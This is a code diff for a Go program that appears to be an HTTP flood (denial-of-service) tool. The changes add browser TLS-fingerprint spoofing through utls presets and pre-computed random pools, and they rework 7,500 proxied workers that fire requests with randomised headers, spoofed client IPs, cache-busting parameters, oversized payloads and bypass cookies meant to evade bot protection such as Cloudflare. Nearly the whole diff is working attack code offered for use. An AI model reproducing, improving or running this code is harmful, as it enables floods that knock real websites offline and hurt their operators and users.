@@ -23,6 +23,7 @@ import (
 	"time"
 
 	"golang.org/x/net/http2"
+	utls "github.com/refraction-networking/utls"
 )
 
 const (
@@ -41,6 +42,7 @@ const (
 	WORKER_COUNT = 7500
 	TIMEOUT      = 6 * time.Second
 	KEEP_ALIVE   = 30 * time.Second
+	POOL_SIZE    = 10000
 )
 
 type BPF struct {
@@ -57,6 +59,35 @@ type BPF struct {
 	Referer      string
 	Origin       string
 	DNT          string
+	Preset       int
+	StaticHeaders []headerItem
+}
+
+var presetList = []utls.ClientHelloID{
+	utls.HelloChrome_124,
+	utls.HelloFirefox_120,
+	utls.HelloEdge_120,
+	utls.HelloSafari_16_0,
+}
+
+const (
+	PRESET_CHROME = iota
+	PRESET_FIREFOX
+	PRESET_EDGE
+	PRESET_SAFARI
+)
+
+func getPresetIndex(ua string) int {
+	if strings.Contains(ua, "Firefox") && !strings.Contains(ua, "Edg") {
+		return PRESET_FIREFOX
+	}
+	if strings.Contains(ua, "Edg") || strings.Contains(ua, "Edge") {
+		return PRESET_EDGE
+	}
+	if strings.Contains(ua, "Safari") && !strings.Contains(ua, "Chrome") && !strings.Contains(ua, "Edg") {
+		return PRESET_SAFARI
+	}
+	return PRESET_CHROME
 }
 
 var PFS = []BPF{
@@ -83,21 +114,6 @@ var PFS = []BPF{
 		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
 		SecChUaMov:   "?0",
 		SecChUaPlat:  "macOS",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "https://www.google.com",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?1",
-		SecChUaPlat:  "Android",
 		SecFetchSite: "none",
 		SecFetchMode: "navigate",
 		SecFetchDest: "document",
@@ -151,21 +167,6 @@ var PFS = []BPF{
 		DNT:          "",
 	},
 	{
-		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?0",
-		SecChUaPlat:  "Windows",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "https://www.google.com",
-		DNT:          "",
-	},
-	{
 		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
 		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
 		Lang:         "en-US,en;q=0.9",
@@ -180,21 +181,34 @@ var PFS = []BPF{
 		Origin:       "",
 		DNT:          "",
 	},
-	{
-		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      "",
-		SecChUaMov:   "",
-		SecChUaPlat:  "",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "",
-		DNT:          "",
-	},
+}
+
+func init() {
+	for i := range PFS {
+		PFS[i].Preset = getPresetIndex(PFS[i].UA)
+		// Pre-compute static headers for each profile
+		PFS[i].StaticHeaders = buildStaticHeaders(PFS[i])
+	}
+}
+
+func buildStaticHeaders(p BPF) []headerItem {
+	h := []headerItem{}
+	if p.SecChUa != "" {
+		h = append(h, headerItem{"Sec-Ch-Ua", p.SecChUa})
+		h = append(h, headerItem{"Sec-Ch-Ua-Mobile", p.SecChUaMov})
+		h = append(h, headerItem{"Sec-Ch-Ua-Platform", p.SecChUaPlat})
+	}
+	h = append(h, headerItem{"Accept", p.Accept})
+	h = append(h, headerItem{"Accept-Language", p.Lang})
+	h = append(h, headerItem{"Connection", "keep-alive"})
+	h = append(h, headerItem{"Pragma", "no-cache"})
+	h = append(h, headerItem{"Upgrade-Insecure-Requests", "1"})
+	h = append(h, headerItem{"Sec-Fetch-Mode", p.SecFetchMode})
+	h = append(h, headerItem{"Sec-Fetch-Dest", p.SecFetchDest})
+	if p.DNT != "" {
+		h = append(h, headerItem{"DNT", p.DNT})
+	}
+	return h
 }
 
 var (
@@ -223,16 +237,40 @@ var botUAs = []string{
 
 var globalCookie string
 
-var copyBufferPool = sync.Pool{
+var headerPool = sync.Pool{
 	New: func() interface{} {
-		return make([]byte, 32*1024)
+		return make([]headerItem, 0, 80)
 	},
 }
 
-var stringBufferPool = sync.Pool{
-	New: func() interface{} {
-		return &strings.Builder{}
-	},
+type headerItem struct{ key, value string }
+
+var (
+	randStringPool []string
+	randIntPool    []int64
+	randIndex      uint64
+)
+
+func init() {
+	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+	randStringPool = make([]string, POOL_SIZE)
+	for i := 0; i < POOL_SIZE; i++ {
+		randStringPool[i] = randStr(rng, 8)
+	}
+	randIntPool = make([]int64, POOL_SIZE)
+	for i := 0; i < POOL_SIZE; i++ {
+		randIntPool[i] = rng.Int63()
+	}
+}
+
+func getRandString() string {
+	idx := atomic.AddUint64(&randIndex, 1) % POOL_SIZE
+	return randStringPool[idx]
+}
+
+func getRandInt() int64 {
+	idx := atomic.AddUint64(&randIndex, 1) % POOL_SIZE
+	return randIntPool[idx]
 }
 
 func randIP(rng *rand.Rand) string {
@@ -818,87 +856,108 @@ func main() {
 		})
 	}
 
-	type clientWrap struct {
-		client *http.Client
-		ip     string
-	}
-	clients := make([]clientWrap, len(proxies))
+	numPresets := len(presetList)
+	clients := make([][]*http.Client, len(proxies))
 	for i, proxyURL := range proxies {
-		tr := &http.Transport{
-			DialContext: (&net.Dialer{
-				Timeout:   4 * time.Second,
-				KeepAlive: KEEP_ALIVE,
-			}).DialContext,
-			DisableKeepAlives:     false,
-			DisableCompression:    true,
-			MaxIdleConns:          10000,
-			MaxIdleConnsPerHost:   5000,
-			MaxConnsPerHost:       0,
-			IdleConnTimeout:       KEEP_ALIVE,
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-				MinVersion:         tls.VersionTLS12,
-				MaxVersion:         tls.VersionTLS13,
-				NextProtos:         []string{"h2", "http/1.1"},
-				CipherSuites: []uint16{
-					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+		clients[i] = make([]*http.Client, numPresets)
+		for pIdx := 0; pIdx < numPresets; pIdx++ {
+			preset := presetList[pIdx]
+			tr := &http.Transport{
+				DialContext: (&net.Dialer{
+					Timeout:   4 * time.Second,
+					KeepAlive: KEEP_ALIVE,
+				}).DialContext,
+				DisableKeepAlives:     false,
+				DisableCompression:    false,
+				MaxIdleConns:          10000,
+				MaxIdleConnsPerHost:   5000,
+				MaxConnsPerHost:       0,
+				IdleConnTimeout:       KEEP_ALIVE,
+				TLSClientConfig:       nil,
+				ForceAttemptHTTP2:     true,
+				TLSHandshakeTimeout:   4 * time.Second,
+				ResponseHeaderTimeout: 4 * time.Second,
+				ExpectContinueTimeout: 0 * time.Second,
+				DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+					dialer := &net.Dialer{
+						Timeout:   4 * time.Second,
+						KeepAlive: KEEP_ALIVE,
+					}
+					conn, err := dialer.DialContext(ctx, network, addr)
+					if err != nil {
+						return nil, err
+					}
+					h, _, _ := net.SplitHostPort(addr)
+					if h == "" {
+						h = parsedTarget.Hostname()
+					}
+					config := &tls.Config{
+						ServerName:         h,
+						InsecureSkipVerify: true,
+					}
+					uconn := utls.UClient(conn, config, preset)
+					if err := uconn.Handshake(); err != nil {
+						conn.Close()
+						return nil, err
+					}
+					return uconn, nil
 				},
-			},
-			ForceAttemptHTTP2:     true,
-			TLSHandshakeTimeout:   4 * time.Second,
-			ResponseHeaderTimeout: 4 * time.Second,
-			ExpectContinueTimeout: 0 * time.Second,
-		}
-		_ = http2.ConfigureTransport(tr)
-		ip := ""
-		if proxyURL != nil {
-			tr.Proxy = http.ProxyURL(proxyURL)
-			ip = proxyURL.Hostname()
-		}
-		jar, _ := cookiejar.New(nil)
-		clients[i] = clientWrap{
-			client: &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar},
-			ip:     ip,
+			}
+			if proxyURL != nil {
+				tr.Proxy = http.ProxyURL(proxyURL)
+			}
+			jar, _ := cookiejar.New(nil)
+			clients[i][pIdx] = &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar}
 		}
 	}
-
-	type headerItem struct{ key, value string }
 
 	var totalRequests, totalErrors int64
+	precomputedPaths := make([]string, POOL_SIZE)
+	for i := 0; i < POOL_SIZE; i++ {
+		precomputedPaths[i] = "/" + getRandString() + "/"
+	}
+	precomputedCacheBusters := make([]string, POOL_SIZE)
+	for i := 0; i < POOL_SIZE; i++ {
+		precomputedCacheBusters[i] = strconv.FormatInt(getRandInt(), 16)
+	}
+	precomputedIfModifiedSince := make([]string, 10)
+	for i := 0; i < 10; i++ {
+		precomputedIfModifiedSince[i] = time.Now().AddDate(-1, 0, -i).Format(time.RFC1123)
+	}
+	precomputedReferers := make([]string, len(validReferers))
+	copy(precomputedReferers, validReferers)
 
 	for w := 0; w < WORKER_COUNT; w++ {
 		wg2.Add(1)
-		cw := clients[w%len(clients)]
-		go func(cli clientWrap, workerID int) {
+		go func(workerID int) {
 			defer wg2.Done()
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
-			headers := make([]headerItem, 0, 64)
 
 			for ctx.Err() == nil {
-				headers = headers[:0]
+				proxyIdx := rng.Intn(len(clients))
+				profIdx := rng.Intn(len(PFS))
+				prof := PFS[profIdx]
+				client := clients[proxyIdx][prof.Preset]
 
 				method := validMethods[rng.Intn(len(validMethods))]
-				ua := validUserAgents[rng.Intn(len(validUserAgents))]
+				ua := prof.UA
 				if rng.Intn(10) < 3 && len(botUAs) > 0 {
 					ua = botUAs[rng.Intn(len(botUAs))]
 				}
-				ref := validReferers[rng.Intn(len(validReferers))]
 				enc := validEncodings[rng.Intn(len(validEncodings))]
 				cacheCtrl := validCacheControls[rng.Intn(len(validCacheControls))]
 
 				forIP := proxyIPs[rng.Intn(len(proxyIPs))]
-				realIP := cli.ip
+				realIP := ""
+				if proxyIdx < len(proxyIPs) {
+					realIP = proxyIPs[proxyIdx]
+				}
 				if realIP == "" {
 					realIP = forIP
 				}
 
 				origin := validOrigins[rng.Intn(len(validOrigins))]
-				referer := ref
+				referer := precomputedReferers[rng.Intn(len(precomputedReferers))]
 				if origin != "" {
 					for _, r := range validReferers {
 						if strings.Contains(r, host) || strings.Contains(r, "google") || strings.Contains(r, "bing") {
@@ -912,13 +971,11 @@ func main() {
 					secFetchSite = "same-origin"
 				}
 
-				prof := PFS[rng.Intn(len(PFS))]
-
 				params := []string{}
 				params = append(params, "_="+strconv.FormatInt(time.Now().UnixNano(), 10))
 				for j := 0; j < 1+rng.Intn(3); j++ {
 					key := cacheParams[rng.Intn(len(cacheParams))]
-					val := strconv.FormatInt(rng.Int63(), 10)
+					val := strconv.FormatInt(getRandInt(), 10)
 					params = append(params, key+"="+val)
 				}
 				if maxPayloadSize > 0 && rng.Intn(3) == 0 {
@@ -926,15 +983,10 @@ func main() {
 					if size < 1 {
 						size = 64
 					}
-					sb := stringBufferPool.Get().(*strings.Builder)
-					sb.Reset()
-					sb.WriteString("big=")
-					sb.WriteString(strings.Repeat("x", size))
-					params = append(params, sb.String())
-					stringBufferPool.Put(sb)
+					params = append(params, "big="+strings.Repeat("x", size))
 				}
 				if rng.Intn(10) == 0 {
-					params = append(params, randStr(rng, 8)+"="+randStr(rng, 12))
+					params = append(params, getRandString()+"="+getRandString())
 				}
 
 				finalURL := target
@@ -944,7 +996,7 @@ func main() {
 					if !strings.HasSuffix(path, "/") {
 						path += "/"
 					}
-					path += randStr(rng, 4) + "/"
+					path += precomputedPaths[rng.Intn(POOL_SIZE)]
 					u.Path = path
 					finalURL = u.String()
 				}
@@ -959,6 +1011,9 @@ func main() {
 					body = strings.NewReader("")
 				}
 				req, _ := http.NewRequest(method, finalURL, body)
+
+				headers := headerPool.Get().([]headerItem)
+				headers = headers[:0]
 
 				if method == "POST" {
 					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
@@ -982,24 +1037,7 @@ func main() {
 				}
 				headers = append(headers, headerItem{"Sec-Fetch-Site", secFetchSite})
 
-				headers = append(headers, headerItem{"Accept", prof.Accept})
-				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
-				headers = append(headers, headerItem{"Connection", "keep-alive"})
-				headers = append(headers, headerItem{"Pragma", "no-cache"})
-				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
-				headers = append(headers, headerItem{"If-Modified-Since", time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)})
-				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})
-
-				if prof.SecChUa != "" {
-					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
-					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
-					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
-				}
-				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
-				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
-				if prof.DNT != "" {
-					headers = append(headers, headerItem{"DNT", prof.DNT})
-				}
+				headers = append(headers, prof.StaticHeaders...)
 
 				if rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"TE", "trailers"})
@@ -1017,20 +1055,20 @@ func main() {
 					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
 				}
 				if rng.Intn(5) == 0 {
-					headers = append(headers, headerItem{"source-ip", randStr(rng, 5)})
+					headers = append(headers, headerItem{"source-ip", getRandString()})
 				}
 				if rng.Intn(4) == 0 {
 					headers = append(headers, headerItem{"Data-Return", "false"})
 				}
 
 				if bypassSupport["X-Original-URL"] && rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
+					headers = append(headers, headerItem{"X-Original-URL", "/" + getRandString()})
 				}
 				if bypassSupport["X-Forwarded-Host"] && rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
+					headers = append(headers, headerItem{"X-Forwarded-Host", getRandString() + "t.me/ytdizflyze"})
 				}
 				if bypassSupport["X-Request-ID"] && rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
+					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(getRandInt(), 16)})
 				}
 				if bypassSupport["CF-Connecting-IP"] && rng.Intn(5) == 0 {
 					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
@@ -1059,7 +1097,7 @@ func main() {
 				cookies = append(cookies, generateBypassCookie())
 				for _, name := range cookieNames {
 					if rng.Intn(2) == 0 {
-						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
+						cookies = append(cookies, name+"="+strconv.FormatInt(getRandInt(), 16))
 					}
 				}
 				if len(cookies) > 0 {
@@ -1069,7 +1107,7 @@ func main() {
 				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
 				headers = append(headers, headerItem{"X-Real-IP", realIP})
 				headers = append(headers, headerItem{"Range", "bytes=0-"})
-				headers = append(headers, headerItem{"If-None-Match", `"` + randStr(rng, 16) + `"`})
+				headers = append(headers, headerItem{"If-None-Match", `"` + getRandString() + `"`})
 				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
 				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
 				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + randIP(rng)})
@@ -1086,18 +1124,18 @@ func main() {
 					req.Header.Set(h.key, h.value)
 				}
 
-				resp, err := cli.client.Do(req)
+				resp, err := client.Do(req)
 				if err == nil {
-					buf := copyBufferPool.Get().([]byte)
-					io.CopyBuffer(io.Discard, resp.Body, buf)
-					copyBufferPool.Put(buf)
+					io.Copy(io.Discard, resp.Body)
 					resp.Body.Close()
 					atomic.AddInt64(&totalRequests, 1)
 				} else {
 					atomic.AddInt64(&totalErrors, 1)
 				}
+
+				headerPool.Put(headers)
 			}
-		}(cw, w)
+		}(w)
 	}
 
 	sig := make(chan os.Signal, 1)
